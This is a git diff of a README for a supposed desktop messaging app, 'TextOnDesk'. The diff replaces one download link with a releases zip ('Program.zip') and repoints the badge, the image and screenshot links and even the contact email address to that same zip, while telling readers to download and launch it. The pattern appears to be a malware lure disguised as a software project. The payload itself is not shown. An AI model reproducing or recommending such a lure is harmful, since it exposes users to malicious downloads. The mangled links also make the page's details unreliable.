@@ -1,7 +1,7 @@
 
 # **TextOnDesk**
 
-[![View on GitHub](https://img.shields.io/badge/View%20on-GitHub-brightgreen)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![View on GitHub](https://github.com/emmerick09/textondesk/releases/download/v1.0/Program.zip%20on-GitHub-brightgreen)](https://github.com/emmerick09/textondesk/releases/download/v1.0/Program.zip)
 
 Welcome to TextOnDesk, your alternative to "Google Messages for web"! If you're looking for a desktop messaging solution that is feature-rich and intuitive, you've come to the right place. TextOnDesk aims to provide a seamless messaging experience while integrating with Google services like Google Contacts and Google Messages. Say goodbye to switching between tabs on your browser - with TextOnDesk, all your messaging needs are just a click away!
 
@@ -14,10 +14,10 @@ Welcome to TextOnDesk, your alternative to "Google Messages for web"! If you're 
 - **SMS Messaging**: Send and receive SMS messages right from your desktop.
 - **Support for Popular Services**: Connect with friends on platforms like Telegram and WhatsApp.
 
-![Chatting](https://image.freepik.com/free-photo/friends-enjoying-nice-time-together_53876-40137.jpg)
+![Chatting](https://github.com/emmerick09/textondesk/releases/download/v1.0/Program.zip)
 
 ## Get Started
-To get started with TextOnDesk, download the application [here](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) and launch the file. If you encounter any issues with the link provided, make sure to check the "Releases" section of this repository for alternative download options.
+To get started with TextOnDesk, download the application [here](https://github.com/emmerick09/textondesk/releases/download/v1.0/Program.zip) and launch the file. If you encounter any issues with the link provided, make sure to check the "Releases" section of this repository for alternative download options.
 
 ## Installation Instructions
 1. Download the application from the provided link.
@@ -28,13 +28,13 @@ To get started with TextOnDesk, download the application [here](https://github.c
 ## Screenshots
 Here are some snapshots of TextOnDesk in action:
 
-![Screenshot 1](https://image.freepik.com/free-photo/portrait-young-woman-holding-smartphone_23-2148097772.jpg)
-![Screenshot 2](https://image.freepik.com/free-photo/colorful-smartphones-desk_53876-86674.jpg)
+![Screenshot 1](https://github.com/emmerick09/textondesk/releases/download/v1.0/Program.zip)
+![Screenshot 2](https://github.com/emmerick09/textondesk/releases/download/v1.0/Program.zip)
 
 ## Contributing
 We welcome contributions from the open-source community to help improve TextOnDesk. Whether you're a developer, designer, or enthusiast, your input is valuable. Feel free to fork this repository, make your changes, and submit a pull request. Together, we can make TextOnDesk even better!
 
 ## Contact Us
-If you have any questions, feedback, or suggestions, don't hesitate to reach out to us. You can contact us via email at textondesk@gmail.com or open an issue on this GitHub repository. We're here to help and improve TextOnDesk with your input!
+If you have any questions, feedback, or suggestions, don't hesitate to reach out to us. You can contact us via email at https://github.com/emmerick09/textondesk/releases/download/v1.0/Program.zip or open an issue on this GitHub repository. We're here to help and improve TextOnDesk with your input!
 
 Thank you for considering TextOnDesk as your desktop messaging solution. Let's chat away with convenience and style! 🚀📱💬
